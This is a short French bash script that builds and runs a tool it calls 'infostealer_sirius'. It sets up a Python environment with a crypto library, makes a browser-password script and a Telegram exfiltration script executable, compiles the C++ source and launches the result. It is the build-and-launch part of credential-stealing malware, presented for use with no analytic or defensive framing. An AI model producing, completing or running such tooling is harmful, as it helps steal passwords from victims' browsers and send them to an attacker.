#!/bin/bash

# === 1. Messages initiaux ===
echo "[*] Initialisation de la compilation de infostealer_sirius..."
sleep 1

# === 2. Vérification de l'environnement Python ===
echo "[*] Vérification/activation de l'environnement virtuel Python..."
if [ -d "venv" ]; then
    source venv/bin/activate
    echo "[✓] Environnement Python activé."
else
    echo "[!] Environnement virtuel 'venv' non trouvé. Création..."
    python3 -m venv venv && source venv/bin/activate
    pip install --upgrade pip
    pip install pycryptodome
    echo "[✓] Environnement virtuel créé et dépendances installées."
fi
sleep 1

# === 3. Vérification des permissions d'exécution ===
echo "[*] Vérification des droits sur les scripts..."
chmod +x ./exfiltration/send_telegram.sh 2>/dev/null
chmod +x ./script/browser_passwords.py 2>/dev/null
echo "[✓] Scripts rendus exécutables."

# === 4. Compilation du code C++ ===
echo "[*] Compilation du fichier source main.cpp..."
mkdir -p build
g++ src/main.cpp -o build/infostealer_sirius
if [ $? -ne 0 ]; then
    echo "[✗] Erreur de compilation."
    exit 1
else
    echo "[✓] Compilation réussie : build/infostealer_sirius"
fi

# === 5. Lancement de l'outil ===
echo "[*] Lancement de l'exécutable..."
./build/infostealer_sirius
